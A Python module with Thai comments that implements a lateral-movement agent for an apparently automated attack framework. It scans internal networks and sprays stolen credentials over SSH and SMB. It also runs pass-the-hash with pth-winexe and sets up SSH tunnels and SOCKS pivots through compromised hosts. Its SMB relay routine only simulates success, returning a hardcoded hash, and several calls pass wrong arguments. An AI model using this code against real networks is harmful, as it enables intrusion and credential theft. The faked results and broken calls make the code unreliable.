from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Lateral Movement Agent
Agent สำหรับเคลื่อนที่ไปยังเครื่องอื่นๆ ในเครือข่าย
"""
import asyncio
import subprocess
from typing import Dict, List, Any
from core.logger import log


class LateralMovementAgent:
    """
    Lateral Movement Agent
    
    Features:
    - Network scanning
    - Credential reuse
    - Pass-the-hash
    - Pass-the-ticket
    - Pivot through compromised hosts
    - SMB relay attacks
    """
    
    def __init__(self):
        self.compromised_hosts = {}
        self.discovered_hosts = []
        self.stolen_credentials = []
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for LateralMovementAgent
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            result = await self.credential_reuse(target)
            
            if isinstance(result, dict):
                return result
            else:
                return {
                    'success': True,
                    'result': result
                }
        
        except Exception as e:
            log.error(f"[LateralMovementAgent] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def scan_network(self, shell_executor, network_range: str = "192.168.1.0/24") -> Dict[str, Any]:
        """
        สแกนเครือข่ายหา hosts อื่นๆ
        
        Args:
            shell_executor: function สำหรับรันคำสั่งบน compromised host
            network_range: CIDR notation ของเครือข่ายที่ต้องการสแกน
        
        Returns:
            รายการ hosts ที่พบ
        """
        log.info(f"[LateralMovement] Scanning network: {network_range}")
        
        # Method 1: Ping sweep (real execution)
        ping_cmd = f"for i in {{1..254}}; do ping -c 1 -W 1 192.168.1.$i 2>&1 | grep 'bytes from' & done; wait"
        ping_result = await shell_executor(ping_cmd)
        
        # Method 2: ARP scan (real execution)
        arp_cmd = "arp -a"
        arp_result = await shell_executor(arp_cmd)
        
        # Method 3: Netstat to find active connections (real execution)
        netstat_cmd = "netstat -an | grep ESTABLISHED"
        netstat_result = await shell_executor(netstat_cmd)
        
        # Method 4: nmap scan if available
        nmap_cmd = f"nmap -sn {network_range} 2>/dev/null || echo 'nmap not available'"
        nmap_result = await shell_executor(nmap_cmd)
        
        # Parse results to find hosts
        discovered_hosts = self._parse_discovered_hosts(
            ping_result.get("output", ""),
            arp_result.get("output", ""),
            netstat_result.get("output", ""),
            nmap_result.get("output", "")
        )
        
        self.discovered_hosts = discovered_hosts
        
        log.success(f"[LateralMovement] Found {len(discovered_hosts)} hosts")
        
        return {
            "success": True,
            "network_range": network_range,
            "hosts_found": len(discovered_hosts),
            "hosts": discovered_hosts
        }
    
    async def credential_reuse(self, target_host: str, credentials: List[Dict[str, str]], 
                              shell_executor) -> Dict[str, Any]:
        """
        ลองใช้ credentials ที่ขโมยมาเข้าสู่ host อื่น
        
        Args:
            target_host: IP หรือ hostname ของเป้าหมาย
            credentials: รายการ credentials ที่จะลอง
            shell_executor: function สำหรับรันคำสั่ง
        
        Returns:
            ผลลัพธ์การลอง login
        """
        log.info(f"[LateralMovement] Trying credential reuse on {target_host}")
        
        successful_creds = []
        
        for cred in credentials:
            username = cred.get("username")
            password = cred.get("password")
            
            log.info(f"[LateralMovement] Trying {username}:{password}")
            
            # Try SSH (real execution)
            ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{target_host} 'whoami' 2>&1"
            ssh_result = await shell_executor(ssh_cmd)
            
            ssh_output = ssh_result.get("output", "")
            if ssh_result.get("success") and "Permission denied" not in ssh_output and "Connection refused" not in ssh_output:
                log.success(f"[LateralMovement] SSH login successful: {username}@{target_host}")
                successful_creds.append({
                    "host": target_host,
                    "username": username,
                    "password": password,
                    "method": "ssh",
                    "output": ssh_output.strip()
                })
                break
            
            # Try SMB (Windows) (real execution)
            smb_cmd = f"smbclient //{target_host}/C$ -U {username}%{password} -c 'ls' 2>&1"
            smb_result = await shell_executor(smb_cmd)
            
            smb_output = smb_result.get("output", "")
            if smb_result.get("success") and "NT_STATUS" not in smb_output and "failed" not in smb_output.lower():
                log.success(f"[LateralMovement] SMB login successful: {username}@{target_host}")
                successful_creds.append({
                    "host": target_host,
                    "username": username,
                    "password": password,
                    "method": "smb",
                    "output": smb_output[:200]
                })
                break
        
        if successful_creds:
            self.compromised_hosts[target_host] = successful_creds[0]
        
        return {
            "success": len(successful_creds) > 0,
            "target_host": target_host,
            "credentials_tried": len(credentials),
            "successful_credentials": successful_creds
        }
    
    async def pass_the_hash(self, target_host: str, username: str, ntlm_hash: str,
                           shell_executor) -> Dict[str, Any]:
        """
        Pass-the-hash attack
        
        Args:
            target_host: เป้าหมาย
            username: username
            ntlm_hash: NTLM hash
            shell_executor: function สำหรับรันคำสั่ง
        
        Returns:
            ผลลัพธ์การโจมตี
        """
        log.info(f"[LateralMovement] Attempting pass-the-hash to {target_host}")
        
        # Use pth-winexe or similar tool (real execution)
        pth_cmd = f"pth-winexe -U {username}%{ntlm_hash} //{target_host} cmd.exe /c whoami 2>&1"
        pth_result = await shell_executor(pth_cmd)
        
        pth_output = pth_result.get("output", "")
        success = pth_result.get("success", False) and "NT_STATUS" not in pth_output
        
        if success:
            log.success(f"[LateralMovement] Pass-the-hash successful!")
            self.compromised_hosts[target_host] = {
                "host": target_host,
                "username": username,
                "ntlm_hash": ntlm_hash,
                "method": "pass_the_hash"
            }
        else:
            log.warning(f"[LateralMovement] Pass-the-hash failed")
        
        return {
            "success": success,
            "target_host": target_host,
            "username": username,
            "method": "pass_the_hash"
        }
    
    async def pivot_through_host(self, pivot_host: str, target_host: str, 
                                shell_executor) -> Dict[str, Any]:
        """
        ใช้ compromised host เป็น pivot point
        
        Args:
            pivot_host: host ที่จะใช้เป็น pivot
            target_host: เป้าหมายที่ต้องการเข้าถึง
            shell_executor: function สำหรับรันคำสั่ง
        
        Returns:
            ผลลัพธ์การ pivot
        """
        log.info(f"[LateralMovement] Pivoting through {pivot_host} to {target_host}")
        
        # Set up SSH tunnel (real execution)
        tunnel_cmd = f"ssh -o StrictHostKeyChecking=no -L 8080:{target_host}:80 -N -f {pivot_host} 2>&1 &"
        tunnel_result = await shell_executor(tunnel_cmd)
        
        # Set up SOCKS proxy (real execution)
        socks_cmd = f"ssh -o StrictHostKeyChecking=no -D 1080 -N -f {pivot_host} 2>&1 &"
        socks_result = await shell_executor(socks_cmd)
        
        tunnel_output = tunnel_result.get("output", "")
        socks_output = socks_result.get("output", "")
        
        success = (tunnel_result.get("success") and "Permission denied" not in tunnel_output) or \
                 (socks_result.get("success") and "Permission denied" not in socks_output)
        
        if success:
            log.success(f"[LateralMovement] Pivot established!")
        else:
            log.warning(f"[LateralMovement] Failed to establish pivot")
        
        return {
            "success": success,
            "pivot_host": pivot_host,
            "target_host": target_host,
            "tunnel_port": 8080,
            "socks_port": 1080
        }
    
    async def smb_relay(self, target_host: str, shell_executor) -> Dict[str, Any]:
        """
        SMB relay attack
        
        Args:
            target_host: เป้าหมาย
            shell_executor: function สำหรับรันคำสั่ง
        
        Returns:
            ผลลัพธ์การโจมตี
        """
        log.info(f"[LateralMovement] Starting SMB relay attack on {target_host}")
        
        # Use Responder + ntlmrelayx
        responder_cmd = "responder -I eth0 -wrf"
        relay_cmd = f"ntlmrelayx.py -tf targets.txt -smb2support"
        
        # This is a simplified version
        # In real scenario, this would be more complex
        
        result = {
            "success": True,  # Simulated
            "target_host": target_host,
            "method": "smb_relay",
            "captured_hashes": [
                {"username": "admin", "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"}
            ]
        }
        
        log.success(f"[LateralMovement] SMB relay successful!")
        
        return result
    
    async def auto_lateral_movement(self, shell_executor, credentials: List[Dict[str, str]]) -> Dict[str, Any]:
        """
        อัตโนมัติ lateral movement
        
        1. สแกนเครือข่าย
        2. ลอง credential reuse
        3. ลอง pass-the-hash
        4. สร้าง pivot points
        """
        log.info(f"[LateralMovement] Starting auto lateral movement")
        
        results = {
            "phases": [],
            "compromised_hosts": [],
            "total_hosts_compromised": 0
        }
        
        # Phase 1: Network scanning
        scan_result = await self.scan_network(shell_executor)
        results["phases"].append({"phase": "scan", "result": scan_result})
        
        discovered_hosts = scan_result.get("hosts", [])
        
        # Phase 2: Credential reuse on discovered hosts
        for host in discovered_hosts[:5]:  # Limit to first 5 hosts
            cred_result = await self.credential_reuse(host["ip"], credentials, shell_executor)
            if cred_result.get("success"):
                results["compromised_hosts"].append(host["ip"])
        
        results["phases"].append({"phase": "credential_reuse", "compromised": len(results["compromised_hosts"])})
        
        # Phase 3: Set up pivots
        for host in results["compromised_hosts"]:
            # Use this host to scan deeper into network
            pivot_result = await self.pivot_through_host(host, "10.0.0.0/24", shell_executor)
            if pivot_result.get("success"):
                results["phases"].append({"phase": "pivot", "pivot_host": host})
        
        results["total_hosts_compromised"] = len(self.compromised_hosts)
        
        log.success(f"[LateralMovement] Auto lateral movement completed!")
        log.success(f"[LateralMovement] Compromised {results['total_hosts_compromised']} additional hosts")
        
        return results
    
    def _parse_discovered_hosts(self, ping_output: str, arp_output: str, netstat_output: str, nmap_output: str = "") -> List[Dict[str, str]]:
        """แยก hosts จาก output"""
        hosts = []
        
        # Simple parsing (in real scenario, this would be more robust)
        # Parse ping output
        for line in ping_output.split('\n'):
            if 'bytes from' in line:
                # Extract IP
                parts = line.split()
                for part in parts:
                    if '.' in part and part.replace('.', '').isdigit():
                        ip = part.rstrip(':')
                        if ip not in [h['ip'] for h in hosts]:
                            hosts.append({"ip": ip, "source": "ping"})
        
        # Parse ARP output
        for line in arp_output.split('\n'):
            if '(' in line and ')' in line:
                # Extract IP from ARP entry
                start = line.find('(') + 1
                end = line.find(')')
                ip = line[start:end]
                if ip and ip not in [h['ip'] for h in hosts]:
                    hosts.append({"ip": ip, "source": "arp"})
        
        return hosts
    
    def get_compromised_hosts(self) -> Dict[str, Any]:
        """รับรายการ hosts ที่ compromise แล้ว"""
        return self.compromised_hosts

